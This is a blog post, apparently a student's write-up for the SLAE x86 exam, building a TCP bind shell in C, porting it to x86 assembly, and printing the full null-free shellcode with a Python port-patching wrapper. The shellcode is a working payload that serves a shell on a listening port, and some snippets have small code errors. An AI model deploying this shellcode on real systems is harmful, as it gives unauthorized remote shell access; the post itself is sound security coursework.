---
layout: post
title:  "SLAE x86 Exam - Assignment 1"
categories: certs slae 
---


Hello everyone.

#### A short review
Starting the new year, I decided to take the SLAE x86 course from Pentester Academy, after reading a lot of other reviews about the high quality of the contents and also, as part of my _OSCE_ prep.
Prerequisites for the course are only a basic knowledge in Linux/*nix, while also a basic understanding of programming, C and Python specifically, won't hurt as well, but no Assembly prior knowledge is needed (I did not even know anything about it before the course), as Vivek, the instructor  which is also an infosec ninja, will teach you smoothly from A to Z. 
The course consists in 36 videos, length average is ~15 minutes for each video.    You can take a look at the syllabus [here](http://pentesteracademy.com/course.php?id=3).
The exam consists in 7 assignments , no restrictions on the time/tools being used. 


## Assignment #1 - TCP bind shell
_Student ID: **PA-7854**_

The assignment indications are as follows:
* _Create a bind shell TCP shellcode, where port should be easily configurable_

This first one seems to be easy, since it was taught in the course in some manner.

In summary, these are the steps  we will take in order to achieve the bind shell:
1. Writing a bind shell in C 
2. Analyzing code
3. Replicating in Assembly
4. Port wrapper


The code is available at [my github repo](https://github.com/0xKiewicz/SLAE)

#### 1. Writing a bind shell in C 

bind_shell.c
```c
int resultfd, sockfd;
int port = 12345;
struct sockaddr_in bind_address;
 sockfd = socket(AF_INET, SOCK_STREAM, 0);
        int slength = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &slength, sizeof(one));
// set struct values
 bind_address.sin_family = AF_INET; // = 2
 bind_address.sin_port = htons(port); // port = 1234
 bind_address.sin_addr.s_addr = INADDR_ANY; // NULLL (no IP)

// syscall bind = 361
 bind(sockfd, (struct sockaddr *) &bind_address, sizeof(bind_address));

// syscall listen = 363
 listen(sockfd, 0);

// syscall socketcall (sys_accept 5)
 resultfd = accept(sockfd, NULL, NULL);

// syscall dup2 = 63
 dup2(resultfd, 2);
 dup2(resultfd, 1);
 dup2(resultfd, 0);

// syscall execve = 11
 execve("/bin/sh", NULL, NULL);
```

We compile and run it, just to verify it's working and to ease the next step:

```bash
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./bind_shell
^C
```

Now it's time to analyze syscalls.

#### 2. Analyzing code
As we can see, there are a couple of syscalls that are being executed in order to get the bind shell working (We could've used `strace` to see the syscalls too).

We need to find the syscall numbers, for that, we can take a look at the `unistd_32.h` header file, located at `/usr/include/i386-linux-gnu/asm/unistd_32.h` on my Debian x86 machine. Also, with the help of the `man` command we can see the accepted function parameters type and values, as well as the return code (if any) as follows: `man 2 socket`

All in all, these are the syscalls being executed:

* socket
* setsockopt (which is part of the socket library)
* bind
* listen
* accept
* dup2
* execve


#### 3. Replicating in Assembly
After getting the whole information, we can start building our bind shell in Assembly. This is a snippet of the final result:
```nasm
		; First we zero out the registers
		xor ebx, ebx
		xor ecx, ecx
		xor esi, esi
		mul ebx

		; Next, we build the socket fd with its corresponding syscall
		; socketcall = 102, socketcall type = 1 (sys_socket)
		; IPv4 and TCP (0)
		; sockfd = socket(AF_INET, SOCK_STREAM, 0);
		
		mov al, 0x66 				; socketcall syscall = 102 (decimal)
		mov bl, 0x1  	 				; sys_socket (socketcall)
		push ecx    	    				; TCP
		push 0x1						; SOCK_STREAM
		push 0x2						; AF_INET
		
		mov ecx, esp					; address (pointer) of the array
		int 0x80							; interrupt vector (syscall)
```		

After assembling and linking it, we get the shellcode:
```bash
$ for i in $(objdump -d -M intel bind_shell | grep "^ " | cut -f2); do echo -ne '\\x'$i; done
\x31\xdb\x31\xc9\x31\xf6\xf7\xe3\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x0e\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x02\x31\xc9\x66\x51\x66\x68\x30\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x52\xcd\x80\xb0\x66\xb3\x05\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x89\xf1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80
```

It does not contain NULL bytes, great!

#### 4. Port wrapper
We need to write a script so that a user can easily choose the port number as desired. I've chosen Python as the programming language to work with, since it's easier (or i guess so). Here is a snippet including the shellcode generated from previous file:

```python
import os


if len(sys.argv) != 2:
    print("Usage: " + sys.argv[0] + " [PORT]")
    print("[!] Remember: Ports under 1024 should be run under root")
    exit(1)

port = int(sys.argv[1])

if port < 1024 and os.geteuid != 0:
    print("[E] To bind a port number < 1024 you need to be root")
    exit(2)

# Remove 0x char suffix
port = hex(port).strip('0x')


shellcode = ("\\x31\\xdb\\x31\\xc9\\x31\\xf6\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x66\\xb3\\x0e\\x6a\\x04\\x54\\x6a\\x02\\x6a\\x01\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x02\\x31\\xc9\\x66\\x51\\x66\\x68\\x30\\x39\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x56\\x52\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x56\\x56\\x52\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x3f\\x89\\xd3\\x89\\xf1\\xcd\\x80\\xb0\\x3f\\xb1\\x01\\xcd\\x80\\xb0\\x3f\\xb1\\x02\\xcd\\x80\\xb0\\x0b\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xf1\\x89\\xf2\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80") 
# Get offset
offset = shellcode.index("\\x30\\x39")
splitted = list(shellcode)

splitted[offset:offset+8] = '\\x' + str(port[2:4]) + '\\x' + str(port[0:2]) 

```

Now just reminds to copy the resulting shellcode, compile the file (with no stack protector) and run it to verify.

Enough for now.

